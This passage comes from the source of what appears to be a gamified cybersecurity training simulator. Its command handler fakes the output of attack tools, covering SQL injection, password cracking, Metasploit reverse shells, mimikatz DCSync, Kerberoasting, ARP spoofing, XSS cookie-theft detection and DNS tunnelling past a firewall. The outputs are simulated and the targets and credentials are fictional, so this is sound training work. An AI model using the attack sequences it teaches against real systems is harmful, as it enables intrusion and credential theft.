  if (cmd === "nikto") return { output: `- Nikto v2.1.6\n+ Server: Apache/2.4.41 (Ubuntu)\n+ X-Content-Type-Options header not set\n+ PHP/7.4.3 version exposed\n+ Cookie PHPSESSID missing Secure flag\n+ /robots.txt: 4 entries (review manually)\n+ /admin/: Interesting directory\n+ /.env: Possible credentials file [!]\n+ 7915 requests: 8 items reported`, newCwd: cwd };
  if (cmd === "whatweb") return { output: args[0] ? `${args[0]} [200 OK] Apache[2.4.41], PHP[7.4.3], Title[Axiom Systems Internal], Cookie[PHPSESSID], X-Powered-By[PHP/7.4.3]` : "Usage: whatweb <url>", newCwd: cwd };

  // exploitation tools
  if (cmd === "sqlmap") return { output: `sqlmap 1.7.11\n\n[*] Testing: http://10.0.0.10/admin/login.php\n[*] Parameter 'username' is VULNERABLE!\n    Type: boolean-based blind\n    Type: time-based blind\n    Type: UNION query\n\n[*] Database: corpdb\n[*] Tables: users, sessions, config, logs\n\nDatabase: corpdb — Table: users\n+----+----------+-------------------+-------+\n| id | username | password          | role  |\n+----+----------+-------------------+-------+\n|  1 | admin    | AdminAxiom2024!   | admin |\n|  2 | jrich    | 5f4dcc3b... (MD5) | user  |\n\n[!] Admin plaintext password found in config table`, newCwd: cwd };
  if (cmd === "hydra") return { output: `Hydra v9.4\n\n[STATUS] 1024 tries/min\n[80][http-post-form] host: 10.0.0.10  login: admin  password: admin123\n\n1 valid password found!\nlogin: admin  password: admin123 (position 247 in rockyou.txt)`, newCwd: cwd };
  if (cmd === "hashcat") {
    if (input.includes("-m 0")) return { output: `hashcat v6.2.6\nHash.Mode: 0 (MD5)\n\n5f4dcc3b5aa765d61d8327deb882cf99:password\n\nStatus: Cracked\nSpeed: 847.3 MH/s\nRecovered: 1/1 (100%)`, newCwd: cwd };
    if (input.includes("-m 1000")) return { output: `hashcat v6.2.6\nHash.Mode: 1000 (NTLM)\n\naad3b435b51404eeaad3b435b51404ee:password\n\nStatus: Cracked`, newCwd: cwd };
    if (input.includes("-m 13100")) return { output: `hashcat v6.2.6\nHash.Mode: 13100 (Kerberos TGS-REP)\n\n[00:08:23] $krb5tgs$23$*svc_backup...:BackupPass2023!\n\nStatus: Cracked\n\n[+] svc_backup account password: BackupPass2023!`, newCwd: cwd };
    if (input.includes("-r")) return { output: `hashcat v6.2.6\nUsing rules: best64.rule (77 rules)\n\nhash:Password1!\n\nStatus: Cracked\n\n[+] Password1! — common corporate pattern (rules found it)`, newCwd: cwd };
    if (input.includes("-a 3")) return { output: `hashcat v6.2.6\nAttack mode: Mask\n\nhash:Corp2024!\n\nStatus: Cracked`, newCwd: cwd };
    return { output: `hashcat v6.2.6\n[*] Running with provided options\n[*] Use hash-identifier to find the correct -m mode`, newCwd: cwd };
  }
  if (cmd === "john") return { output: `Using default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt)\nUsing wordlist: rockyou.txt\n\nAxiom2024!  (stranger)\n\n1g 0:00:02:47 DONE\nUse --show to display cracked passwords`, newCwd: cwd };
  if (cmd === "hash-identifier") return { output: `Enter hash: (paste hash)\n\nPossible hash: MD5\nAlso possible: NTLM (same length, different format)\n(Use hashcat --example-hashes to verify)`, newCwd: cwd };
  if (cmd === "msfconsole") return { output: `\n     ,           ,\n    /(\`--')----/(\`--')\n   =[   D[)]   =[   D[)]\n\nMetasploit Framework v6.3.44\n\nmsf6 > (search, use, show options, set RHOSTS, run)\nTip: search type:exploit platform:linux`, newCwd: cwd };
  if (cmd === "search" || cmd === "use" || cmd === "show" || cmd === "set" || cmd === "run" || cmd === "exploit") {
    const msf = {search:`[*] Matching Modules\n\n   # Name                                    Disclosure  Rank\n   0 exploit/windows/smb/ms17_010_eternalblue  2017-03-14  average\n   1 auxiliary/scanner/smb/smb_ms17_010        2017-03-14  normal`,use:`[*] Using module. Set options with: show options`,show:`Module options:\n  Name    Current  Required  Description\n  ----    -------  --------  -----------\n  RHOSTS           yes       Target host`,set:"[*] RHOSTS set",run:"[*] Started handler\n[*] Sending exploit...\n[*] Sending encoded stage\n[+] Meterpreter session 1 opened!\nmsf6 > sessions -i 1\nmeterpreter > ",exploit:"[*] Executing exploit...\n[+] Session opened!"};
    return { output: msf[cmd]||"ok", newCwd: cwd };
  }
  if (cmd === "sysinfo" || cmd === "getuid" || cmd === "getsystem" || cmd === "hashdump") {
    const m = {sysinfo:"Computer  : AXIOM-TARGET\nOS        : Linux 5.4.0 Ubuntu 20.04\nArch      : x64\nMeterpreter: x64/linux",getuid:"Server username: www-data (UID 33)",getsystem:"[+] Got system via technique 1 (Linux sudo/SUID exploitation).\n[+] Now running as: root",hashdump:"root:$6$random$Kc4.UXBMs7nVeEm8...:18628:0:99999:7:::\nstranger:$6$salt$hash...:18628:0:99999:7:::\nsvc_backup:$6$othersalt$otherhash...:18628:0:99999:7:::"};
    return { output: m[cmd]||"ok", newCwd: cwd };
  }
  if (cmd === "msfvenom") {
    if (args.includes("-l")) return { output: "linux/x64/shell_reverse_tcp\nlinux/x64/meterpreter/reverse_tcp\nwindows/x64/meterpreter/reverse_tcp\nphp/meterpreter_reverse_tcp\npython/meterpreter/reverse_tcp\n(... many more)", newCwd: cwd };
    const fmt = args[args.indexOf("-f")+1]||"elf";
    const out = args[args.indexOf("-o")+1]||"shell";
    return { output: `Payload size: 74 bytes\nFinal size of ${fmt} file: 74 bytes\nSaved as: ${out}\n\n[+] Set up listener: nc -lvnp 4444`, newCwd: cwd };
  }
  if (cmd === "searchsploit") {
    if (args.includes("-m")) return { output: `  Copied to: /home/stranger/${args[args.indexOf("-m")+1]}.py`, newCwd: cwd };
    const terms = args.filter(a=>!a.startsWith("-")).join(" ")||"Apache";
    return { output: `Exploit Title                                         | Path\n------------------------------------------------------\n${terms} 2.4.49 Path Traversal RCE (CVE-2021-41773)  | webapps/50383.py\n${terms} mod_cgi RCE                                   | linux/remote/21.sh\n\n[!] Use: searchsploit -m 50383 to copy to current dir`, newCwd: cwd };
  }

  // wifi/bt tools
  if (cmd === "airmon-ng") return { output: args[0]==="start" ? "PHY  Interface  Driver    Chipset\nphy0 wlan0      ath9k_htc AR9271\n\nPHY  Interface  Driver    Chipset\nphy0 wlan0mon   ath9k_htc AR9271 (monitor mode enabled)" : "Usage: airmon-ng start|stop <interface>", newCwd: cwd };
  if (cmd === "airodump-ng") return { output: "BSSID              PWR  Beacons  CH  ENC  ESSID\nAA:BB:CC:DD:EE:FF  -41  24        6  WPA2 AxiomCorpWifi\n11:22:33:44:55:66  -72  8         1  WPA2 HomeNetwork_2.4\n\nSTATION            BSSID              PWR  Frames\nC8:94:02:11:22:33  AA:BB:CC:DD:EE:FF  -30  47", newCwd: cwd };
  if (cmd === "aireplay-ng") return { output: args.includes("--deauth") ? "04:32:17 Sending 10 directed DeAuth frames\n04:32:17 Deauth sent — forcing reconnection\n04:32:18 WPA2 handshake captured!" : "Usage: aireplay-ng --deauth N -a BSSID <interface>", newCwd: cwd };
  if (cmd === "aircrack-ng") return { output: "Opening capture.cap\n\n[00:04:13] 2847832/14344391 keys tested\n\n     KEY FOUND! [ password123 ]\n\nMaster Key: 2B 3C 4D 5E...", newCwd: cwd };
  if (cmd === "arpspoof") return { output: args.length ? `Intercepting traffic between ${args[args.indexOf("-t")+1]||"?"} and ${args[args.length-1]||"?"}\nARP replies being sent... (IP forwarding required)` : "Usage: arpspoof -i eth0 -t <target> <gateway>", newCwd: cwd };
  if (cmd === "ettercap") return { output: "ettercap NG-0.8.3\n\nARP poisoning victims:\n GROUP 1: 10.0.0.1\n GROUP 2: 10.0.0.50\n\nStarting Unified sniffing... MITM active.\nCapturing: POST /login.php username=admin&password=CorpPass2021", newCwd: cwd };
  if (cmd === "mitmproxy") return { output: "mitmproxy v10.0\n\nListening on 0.0.0.0:8080\n\n[Intercepted]\nGET http://10.0.0.10/ HTTP/1.1\n← 200 OK 2847 bytes\n\n[Intercepted]\nPOST http://10.0.0.10/admin/login.php\n  username=admin\n  password=CorpPass2021\n← 302 Found", newCwd: cwd };
  if (cmd === "dnschef") return { output: "[*] DNSChef started — DNS cache poisoning active\n[*] Faking all queries to point to 10.0.0.50\n[*] target.com → 10.0.0.50 (your machine)\n[*] Poisoning the resolver: clients cache the forged record\n[*] Every client on this segment now connects to you", newCwd: cwd };
  if (cmd === "hcitool") return { output: args[0]==="scan" ? "Scanning...\n  AA:BB:CC:11:22:33  TDK Life On Record\n  DD:EE:FF:44:55:66  Microsoft Bluetooth Mouse\n  11:22:33:44:55:66  [unknown]" : args[0]==="lescan" ? "LE Scan...\nAA:BB:CC:DD:EE:01 (unknown)\n11:22:33:44:55:66 AxiomWatch\nC8:94:02:11:22:33 (unknown)" : "Usage: hcitool scan|lescan|dev", newCwd: cwd };
  if (cmd === "btscanner") return { output: "btscanner 2.1\n\nDevice: AA:BB:CC:11:22:33\n  Name: TDK Speaker\n  Class: Audio/Video — Loudspeaker\n\nDevice: DD:EE:FF:44:55:66\n  Name: Wireless Keyboard\n  Class: Peripheral — Keyboard\n  [!] HID device — keystrokes may be sniffable unencrypted!", newCwd: cwd };

  // crypto tools
  if (cmd === "openssl") {
    if (args[0]==="s_client"||input.includes("s_client")) return { output: `CONNECTED(00000003)\ndepth=0 CN=internal.axiom-systems.com\n---\nSubject: CN=internal.axiom-systems.com\nSubject Alternative Names:\n  DNS:internal.axiom-systems.com\n  DNS:vpn.axiom-systems.com\n  DNS:access.axiom-systems.com\nExpiry: Nov 30 23:59:59 2024 (15 days!)\n\n[!] SANs reveal all internal subdomains\n[!] Certificate expires in 15 days`, newCwd: cwd };
    if (args[0]==="enc") return { output: args.includes("-d") ? "(file decrypted successfully)" : "(file encrypted with AES-256-CBC)", newCwd: cwd };
    return { output: "Usage: openssl [s_client|enc|dgst|genrsa|req|x509]", newCwd: cwd };
  }
  if (cmd === "gpg") return { output: args.includes("--symmetric") ? "Enter passphrase: ***\nFile encrypted." : "Usage: gpg --symmetric <file>", newCwd: cwd };
  if (cmd === "binwalk") return { output: args[0] ? `DECIMAL   HEXADECIMAL  DESCRIPTION\n0         0x0          JPEG image data\n182736    0x2CA50      Zip archive data, compressed\n\n[!] Embedded ZIP found — run: binwalk -e ${args[0]}` : "Usage: binwalk <file>", newCwd: cwd };
  if (cmd === "steghide") return { output: args.includes("extract") ? "Enter passphrase: \nwrote extracted data to 'hidden_key.txt'\n\nContents: private RSA key + note:\n'access.axiom-systems.com — emergency use only.'\n\n[!] Private key extracted from image metadata!" : "Usage: steghide extract -sf <image>", newCwd: cwd };
  if (cmd === "exiftool") return { output: args[0] ? `File Name: ${args[0]}\nFile Type: JPEG\nImage Width: 1920\nImage Height: 1080\nGPS Latitude: 53° 21' N\nGPS Longitude: 6° 15' W\nAuthor: J. Richardson\nCamera Model: iPhone 13 Pro\nCreate Date: 2024:09:12 14:32:11\n\n[!] GPS coords embedded — location discoverable\n[!] Author: J. Richardson (VP Infrastructure)` : "Usage: exiftool <file>", newCwd: cwd };

  // forensics
  if (cmd === "dd") return { output: args.length ? "22548578304 bytes (23 GB) copied, 47.3 s, 477 MB/s\n(disk.img created)" : "Usage: dd if=<src> of=<dst> bs=<size>", newCwd: cwd };
  if (cmd === "foremost") return { output: "Processing: disk.img\n\nRecovered files:\n  00000001.docx (Word document)\n  00000002.jpg  (JPEG image)\n  00000003.txt  (ASCII text) ← chat_log_2024_08.txt\n\n[!] Deleted file recovered: chat_log_2024_08.txt\nContents: two people planning an operation, 6 weeks ago.", newCwd: cwd };
  if (cmd === "fls") return { output: "d/d 2: .\nr/r 18: welcome.txt\nr/r 22: .bash_history\nr/r * 31: chat_log_2024_08.txt (DELETED — recoverable!)\n(r/r * = deleted but recoverable)", newCwd: cwd };
  if (cmd === "volatility") return { output: args.length ? `Volatility 3 Framework\nPID   Name      PPID  Cmd\n1     systemd   0\n892   sshd      1\n1847  axiom-daemon 1    /opt/axiom/axiom-daemon --key=AxiomM4sterK3y!\n4471  bash      892\n\n[!] axiom-daemon has decryption key in cmdline: AxiomM4sterK3y!` : "Usage: volatility -f memory.raw <plugin>", newCwd: cwd };

  // defense tools
  if (cmd === "ufw") {
    if (args[0]==="status") return { output: "Status: active\nTo          Action  From\n22/tcp      ALLOW   Anywhere\n(v6)        ALLOW   Anywhere", newCwd: cwd };
    return { output: `ufw: ${args.join(" ")} — ok`, newCwd: cwd };
  }
  if (cmd === "iptables") {
    if (args.includes("-L")) return { output: "Chain INPUT (policy DROP)\ntarget  prot  source       destination\nACCEPT  tcp   anywhere     anywhere    tcp dpt:ssh\nACCEPT  all   anywhere     anywhere    state RELATED,ESTABLISHED\nDROP    all   anywhere     anywhere\n\nChain OUTPUT (policy DROP)\ntarget  prot  source       destination\nACCEPT  udp   anywhere     anywhere    udp dpt:domain (53)\nACCEPT  tcp   anywhere     anywhere    tcp dpt:https (443)\nDROP    all   anywhere     anywhere\n\n[!] Egress allowed: 53/UDP and 443/TCP only → DNS tunnel or HTTPS C2", newCwd: cwd };
    if (args.includes("-I")||args.includes("-A")) return { output: "(rule added)", newCwd: cwd };
    return { output: "(iptables: ok)", newCwd: cwd };
  }
  if (cmd === "iptables-save") return { output: "# iptables saved to /etc/iptables/rules.v4", newCwd: cwd };
  if (cmd === "fail2ban-client") return { output: "Status for jail ssh:\n  currently banned: 3\n  total banned: 847\n  banned IPs: 185.220.101.47 185.220.101.32 104.244.73.12", newCwd: cwd };
  if (cmd === "auditctl") return { output: args.length ? "(audit rule added — file/call now being monitored)" : "Usage: auditctl -w <file> -p <perms> -k <key>", newCwd: cwd };
  if (cmd === "ausearch") return { output: "type=SYSCALL msg=audit(1700018951): arch=c000003e syscall=87\nuid=1000 gid=1000 euid=0 comm='python3'\nkey='passwd_changes'\n(File /etc/passwd was accessed by python3 running as root!)", newCwd: cwd };
  if (cmd === "osqueryi") return { output: "osquery> SELECT name,pid,cmdline FROM processes WHERE name LIKE '%python%';\nname    | pid  | cmdline\npython3 | 4471 | python3 -c import socket...\n\nosquery> SELECT * FROM listening_ports;\nport | address   | protocol\n22   | 0.0.0.0   | 6\n80   | 0.0.0.0   | 6\n3306 | 127.0.0.1 | 6", newCwd: cwd };

  // AD tools
  if (cmd === "ldapsearch") return { output: `# LDAPv3 search result\n# numResponses: 848\n\ndn: DC=corp,DC=axiom,DC=local\nobjectClass: domain\nms-DS-MachineAccountQuota: 10\n\ndn: CN=stranger,OU=Users,DC=corp\nobjectClass: user\nsAMAccountName: stranger\nmemberOf: CN=Domain Users\n\n[*] 847 user objects found\n[*] 200 computer objects found\n[*] 15 domain admin accounts`, newCwd: cwd };
  if (cmd === "crackmapexec" || cmd === "cme") return { output: `SMB  10.0.0.100  445  AXIOM-DC  [*] Windows Server 2019 x64 (name:AXIOM-DC) (domain:corp.axiom.local)\nSMB  10.0.0.100  445  AXIOM-DC  [+] corp.axiom.local\\svc_backup:BackupPass2023! (Pwn3d!)\nSMB  10.0.0.20   445  AXIOM-SRV [*] Windows Server 2016 x64\nSMB  10.0.0.20   445  AXIOM-SRV [-] corp.axiom.local\\svc_backup:BackupPass2023! LOGON_FAILURE`, newCwd: cwd };
  if (cmd === "GetUserSPNs.py" || cmd.toLowerCase().includes("getuserspns")) return { output: `Impacket GetUserSPNs.py\n\nServicePrincipalName    Name        MemberOf                Password  Last Set\naxiom/svc_backup.local  svc_backup  CN=Domain Admins         <never>\naxiom/svc_report.local  svc_report  CN=Reporting              2023-01-01\n\n$krb5tgs$23$*svc_backup$CORP.AXIOM.LOCAL$axiom/svc_backup.local*$a7c8d9...\n\n[*] Kerberoastable ticket extracted — crack with hashcat -m 13100`, newCwd: cwd };
  if (cmd === "GetNPUsers.py" || cmd.toLowerCase().includes("getnpusers")) return { output: `Impacket GetNPUsers.py\n\nName        MemberOf              UAC  Description\nsvc_monitor CN=Domain Users        DONT_REQ_PREAUTH\n\n$krb5asrep$23$svc_monitor@CORP.AXIOM.LOCAL:...\n\n[*] AS-REP Roasting ticket — crack offline`, newCwd: cwd };
  if (cmd === "mimikatz") return { output: `  .#####.   mimikatz 2.2.0\n .## ^ ##.  'A La Vie, A L'Amour'\n ## / \\ ##  Benjamin DELPY\n\nPRIVILEGE::Debug: OK\n\nlsadump::dcsync /all:\n  Hash NTLM: aad3b435b51404ee... (KRBTGT)\n  Hash NTLM: 31d6cfe0d16ae931... (Administrator)\n  Hash NTLM: 58a478135a93ac3b... (svc_backup)\n\n[!] All domain hashes extracted via DCSync\n[!] Create Golden Ticket with KRBTGT hash`, newCwd: cwd };
  if (cmd === "winpeas" || cmd === "winpeas.exe") return { output: `WINPEAS — Windows Privilege Escalation\n\n[!] AlwaysInstallElevated: ENABLED\n[!] AutoLogon: DefaultPassword=CorpPass2024!\n[!] Unquoted service path: C:\\Program Files (x86)\\Axiom\\service.exe\n[*] PowerShell history: mysql -u root -pAxiom2021!\n[!] Potato attack possible (SeImpersonatePrivilege)`, newCwd: cwd };

  // SMB
  if (cmd === "smbclient") {
    if (args.includes("-L")) return { output: `Sharename  Type  Comment\n---------  ----  -------\nADMIN$     Disk  Remote Admin\nC$         Disk  Default share\nIPC$       IPC   Remote IPC\nPublic     Disk  Public Share (NO PASSWORD!)\n\n[!] Public share accessible anonymously`, newCwd: cwd };
    return { output: `smb: \\> ls\n  .           D\n  ..          D\n  readme.txt  A  128\n  IT_Backups  D  0\nsmb: \\> cd IT_Backups\nsmb: \\IT_Backups\\> ls\n  password_list_2019.txt  A  47328  ← credentials file\n  server_config.tar.gz    A  184729`, newCwd: cwd };
  }
  if (cmd === "enum4linux") return { output: `enum4linux 0.9.1\n\nShare Enumeration:\n  Public   (DISK)  — no password!\n\nPassword Policy:\n  Minimum length: 7\n  History: 24 passwords\n\nUsers:\n  admin (RID 500)\n  jrichardson (RID 1001)\n  svc_backup (RID 1002)`, newCwd: cwd };
  if (cmd === "snmpwalk") return { output: `iso.3.6.1.2.1.1.1.0 = STRING: "Linux axiom-server 5.4.0-182"\niso.3.6.1.2.1.1.5.0 = STRING: "axiom-server"\niso.3.6.1.2.1.25.1.1.0 = Timeticks: 73243100 (8 days)\niso.3.6.1.2.1.4.20.1.1.10.0.0.10 = IpAddress: 10.0.0.10\n[847 more entries...]`, newCwd: cwd };
  if (cmd === "ftp") return { output: args[0] ? `Connected to ${args[0]}.\n220 FTP Server ready.\nName: anonymous\nPassword:\n230 Anonymous login OK.\nftp> ls\n-rw-r--r-- 1 ftp ftp 1247 server_backup_config.tar.gz\n-rw-r--r-- 1 ftp ftp 384  readme.txt\n[!] Anonymous FTP login successful` : "Usage: ftp <host>", newCwd: cwd };
  if (cmd === "ssh") return { output: args.length ? `ssh: connect to host ${args.find(a=>a.includes("@")||a.match(/\d+\.\d+/))||"?"} port 22: Connection timed out\n(Direct SSH from this machine is blocked — use SOCKS proxy: ssh -D 1080 user@pivot)` : "Usage: ssh [user@]host", newCwd: cwd };

  // lateral/post
  if (cmd === "iodine") return { output: args.length ? "[*] Connecting to DNS tunnel\n[*] Interface created: ip0\n[*] Tunnel established via port 53/UDP\n[*] You can now route traffic through the DNS tunnel\n[!] AXIOM firewall cannot detect this — DNS traffic looks normal" : "Usage: iodine -f -P <pass> <ns> <domain>", newCwd: cwd };
  if (cmd === "proxychains") return { output: `ProxyChains-4.x — running: ${args.join(" ")}\n[proxychains] Dynamic chain: 127.0.0.1:1080 → ${args.find(a=>a.match(/\d+\.\d+/))||"target"}\n(traffic routed through SOCKS proxy on pivot machine)`, newCwd: cwd };
  if (cmd === "arp-scan") return { output: "Interface: eth0\n10.0.0.1  aa:bb:cc:dd:ee:01  Generic Router\n10.0.0.10 08:00:27:12:34:56  Oracle VirtualBox\n10.0.0.20 08:00:27:ab:cd:ef  Oracle VirtualBox\n10.0.0.100 08:00:27:ff:00:01 Oracle VirtualBox\n4 packets received, 0 dropped", newCwd: cwd };
  if (cmd === "theHarvester" || cmd === "theharvester") return { output: `theHarvester 4.4.3\n\n[*] Searching in Google\n\nEmails found:\n  admin@axiom-systems.com\n  jrichardson@axiom-systems.com\n  helpdesk@axiom-systems.com\n\nHosts found:\n  www.axiom-systems.com: 10.0.0.10\n  mail.axiom-systems.com: 10.0.0.15\n  vpn.axiom-systems.com: 10.0.0.20`, newCwd: cwd };

  // python
  if (cmd === "python3" || cmd === "python") {
    if (args.includes("-c") && args[1]) {
      if (args[1].includes("print('alive')")||args[1].includes("print(\"alive\")")) return { output: "alive", newCwd: cwd };
      if (args[1].includes("socket")) return { output: "axiom-kali", newCwd: cwd };
      if (args[1].includes("pty")&&args[1].includes("spawn")) return { output: "root@axiom-kali:/# (stabilised shell — fully interactive TTY)", newCwd: cwd };
      if (args[1].includes("os")) return { output: "uid=0(root) gid=0(root) groups=0(root)", newCwd: cwd };
      return { output: "(python3 -c: executed)", newCwd: cwd };
    }
    return { output: "Python 3.11.6\n>>> ", newCwd: cwd };
  }
  if (cmd === "bash") return { output: args.includes("-c") ? `(bash -c: '${args.slice(1).join(" ")}' executed)` : "bash: new shell (simulation)", newCwd: cwd };

  // escape
  if (input.includes("escape.sh") && (input.includes("--tunnel")||input.includes("chmod")||input.startsWith("./"))) {
    if (input.includes("--tunnel")) return { output: "__ESCAPE__", newCwd: cwd };
    return { output: "(escape.sh found — run it with: ./escape.sh --tunnel dns --target external --encrypt aes256)", newCwd: cwd };
  }

  // linpeas
  if (cmd === "linpeas" || cmd === "./linpeas.sh" || input.includes("linpeas")) {
    return { output: `╔══════════╗\n║ LinPEAS  ║ Linux Privilege Escalation Awesome Script v4.3\n╚══════════╝\n\n╔═══════════╗\n║ SUID Bins ║\n╚═══════════╝\n/usr/bin/vim      [!] GTFOBins — check now\n/usr/bin/python3  [!] GTFOBins — check now\n/usr/bin/find     [!] GTFOBins — check now\n\n╔════════════╗\n║ Sudo Perms ║\n╚════════════╝\n(ALL) NOPASSWD: /usr/bin/vim\n(ALL) NOPASSWD: /usr/bin/python3\n\n╔═══════════════╗\n║ Writable Cron ║\n╚═══════════════╝\n/etc/crontab      [!] World-writable!\n/opt/scripts/backup.sh [!] Writable by stranger!\n\n╔══════════════════╗\n║ Interesting Files║\n╚══════════════════╝\n~/.bashrc         AXIOM_KEY="xK8#mP2@nQ5$"\n~/.bash_history   mysql -h 10.0.0.10 -u root -pAxiom2021!\n\n[!] Multiple privesc vectors found! Check gtfobins.txt`, newCwd: cwd };
  }

  // xss simulation
  if (input.includes("<script>") || input.includes("document.cookie") || input.includes("alert(")) {
    const stored = input.includes("comment") || input.includes("message") || input.includes("post");
    return { output: `[XSS Test]\nPayload: ${input}\nResult: ${stored ? "[STORED XSS] Payload saved to database — executes for every user who views this page" : "[REFLECTED XSS] Payload reflected in response — executes in your browser"}\n\n${input.includes("document.cookie") ? "[!] Cookie theft payload — would exfiltrate session cookies to attacker server" : "[!] XSS confirmed — JavaScript execution in browser context"}`, newCwd: cwd };
  }

  // help
  if (cmd === "help" || cmd === "man" || cmd === "--help") {
    return { output: `TERMINAL REFERENCE — axiom-kali
═══════════════════════════════════════════
NAVIGATION    ls, ls -la, cd, pwd, cat, less, head, tail
SEARCH        grep [-r], find, locate, which, strings
TEXT          awk, sed, sort, uniq, cut, wc
SYSTEM        whoami, id, uname, env, ps aux, top
              systemctl, crontab, journalctl
NETWORK       ip addr, ping, arp, route, netstat, ss
              dig, nslookup, whois, curl, wget, nc, tcpdump
SCRIPTING     bash, python3, echo, export, alias

RECON         nmap, gobuster, nikto, whatweb, dnsrecon
              theHarvester, arp-scan, enum4linux, smbclient
EXPLOIT       searchsploit, msfconsole, msfvenom, sqlmap
              hydra, arpspoof, ettercap, airmon-ng, aircrack-ng
POST-EXPLOIT  sudo -l, linpeas.sh, hashcat, john
              steghide, binwalk, exiftool, volatility
DEFENSE       ufw, iptables, fail2ban-client, auditctl, osqueryi
AD ATTACKS    ldapsearch, GetUserSPNs.py, mimikatz, crackmapexec
ESCAPE        cat /sys/firewall/rules.txt, iodine, escape.sh

REFERENCE FILES (cat these):
  osi_reference.txt  tcp_notes.txt  shells.txt  gtfobins.txt
  hashing.txt  methodology.txt  ad_basics.txt  kerberos.txt  dns_tunnel.txt
  ir_process.txt

↑↓  Navigate command history`, newCwd: cwd };
  }

  if (cmd === "exit" || cmd === "logout" || cmd === "quit") return { output: "logout: cannot exit — find the escape route in /sys/firewall/", newCwd: cwd };
  if (cmd === "ls" || cmd === "dir") return { output: "Desktop  Documents  workspace", newCwd: cwd };

  return { output: `bash: ${parts[0]}: command not found\nType 'help' to see available commands`, newCwd: cwd };
}

// ─────────────────────────────────────────────────────────
// OBJECTIVE CHECKER
// ─────────────────────────────────────────────────────────
function checkObjectives(objs, cmd, output) {
  return objs.map(obj => {
    if (obj.done) return obj;
    try {
      const hit = obj.f(cmd, output);
      return hit ? { ...obj, done: true } : obj;
    } catch (_) { return obj; }
  });
}

// ─────────────────────────────────────────────────────────
// ESCAPE SCREEN
// ─────────────────────────────────────────────────────────
function EscapeScreen({ xp, onReset }) {
  const C = "#00ff41";
  return (
    <div style={{ minHeight:"100vh", background:"#050805", display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", fontFamily:"'Courier New',monospace", padding:24, color:C }}>
      <pre style={{ color:C, fontSize:11, lineHeight:1.3, textAlign:"center", textShadow:`0 0 20px ${C}` }}>{`
████████╗██╗  ██╗███████╗    ███████╗███████╗ ██████╗ █████╗ ██████╗ ███████╗
╚══██╔══╝██║  ██║██╔════╝    ██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝
   ██║   ███████║█████╗      ███████╗██║     ██║     ███████║██████╔╝█████╗
   ██║   ██╔══██║██╔══╝      ╚════██║██║     ██║     ██╔══██║██╔═══╝ ██╔══╝
   ██║   ██║  ██║███████╗    ███████║╚██████╗╚██████╗██║  ██║██║     ███████╗
   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚══════╝ ╚═════╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚══════╝`}</pre>
      <div style={{ marginTop:32, maxWidth:680, width:"100%", color:"#a8cca8", lineHeight:1.9, fontSize:13 }}>
        <div style={{ color:C, marginBottom:16, fontSize:14 }}>You were trapped inside a machine called AXIOM-KALI.<br/>You had nothing but a terminal.<br/>You made it out.</div>
        <div>
          {["Linux from scratch — filesystem, permissions, bash scripting",
            "Processes, services, users, system internals",
            "TCP/IP, DNS, HTTP, packet analysis",
            "Passive recon, OSINT, DNS enumeration, active recon",
            "Nmap, service enumeration, vulnerability scanning",
            "SQL injection, XSS, LFI, command injection, SSRF, JWT attacks",
            "Metasploit, msfvenom, manual exploitation, reverse shells",
            "Linux privilege escalation, persistence, credential harvesting, lateral movement",
            "ARP spoofing, MITM, WiFi attacks, DNS poisoning, Bluetooth recon",
            "Password cracking, encryption, steganography",
            "Log analysis, digital forensics, incident response, memory forensics",
            "System hardening, iptables, IDS, threat hunting",
            "Active Directory, Kerberoasting, DCSync, Golden Tickets",
            "DNS tunnelling through a firewall to freedom",
          ].map((item,i) => (
            <div key={i} style={{ color:"#39a139", marginBottom:6 }}>✓ {item}</div>
          ))}
        </div>
        <div style={{ marginTop:24, color:"#1a6b1a", borderTop:"1px solid #1a3a1a", paddingTop:24 }}>
          Total XP: <span style={{ color:C }}>{xp}</span> — 15 Chapters — Every domain of cybersecurity
          <br/><br/>
          What was AXIOM Systems?<br/>What were they doing with that machine?<br/>Who put you inside it?<br/><br/>
          You don't know. But you're out.<br/>And you know everything they know.<br/><br/>
          <span style={{ color:C }}>You are ready.</span><br/><br/>
          Goodbye, stranger.
        </div>
        <button onClick={onReset} style={{ marginTop:24, background:"transparent", border:"1px solid #1a4d1a", color:"#1a6b1a", fontFamily:"'Courier New',monospace", fontSize:12, padding:"10px 24px", cursor:"pointer", letterSpacing:2 }}>
          ▶ MAIN MENU
        </button>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────
// DRAGON EMBLEM  (original art, phosphor-green)
// ─────────────────────────────────────────────────────────
const DRAGON_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240">
<defs><filter id="dg" x="-50%" y="-50%" width="200%" height="200%"><feGaussianBlur stdDeviation="2.4" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter></defs>
<path d="M158 28 A100 100 0 1 1 64 38" fill="none" stroke="#0e7a24" stroke-width="2.2" opacity="0.65" filter="url(#dg)"/>
<g fill="#00ff41" filter="url(#dg)">
<path d="M150 78 L210 40 L182 78 Z"/><path d="M140 76 L188 34 L168 78 Z"/><path d="M130 74 L162 36 L154 78 Z"/>
<path d="M152 96 C156 80 146 70 130 70 C110 70 92 84 74 96 L34 112 L70 116 L60 124 C70 122 84 118 96 116 C120 112 150 116 152 96 Z"/>
<path d="M104 104 L138 96 L120 110 Z"/>
<path d="M72 122 L40 132 L72 134 C90 150 116 156 138 150 C120 156 96 156 80 146 C73 141 70 132 72 122 Z"/>
<path d="M60 126 L66 140 L72 127 Z"/>
<path d="M150 122 C172 132 184 156 176 182 C169 204 146 214 124 208 C142 206 156 192 156 174 C156 156 142 146 126 148 C140 136 150 130 150 122 Z"/>
<path d="M170 138 l18 -5 -11 14 Z"/><path d="M180 166 l18 3 -13 11 Z"/>
</g>
<path d="M44 120 L96 117 C92 124 80 128 70 128 L46 126 Z" fill="#050805"/>
<circle cx="120" cy="98" r="4.6" fill="#050805"/><circle cx="121" cy="97" r="1.7" fill="#00ff41"/>
</svg>`;
const DRAGON_URI = "data:image/svg+xml;utf8," + encodeURIComponent(DRAGON_SVG);

// ─────────────────────────────────────────────────────────
// GAME OVER  (rm -rf /)
// ─────────────────────────────────────────────────────────
function GameOverScreen({ onReset }) {
  return (
    <div style={{ minHeight:"100vh", display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center",
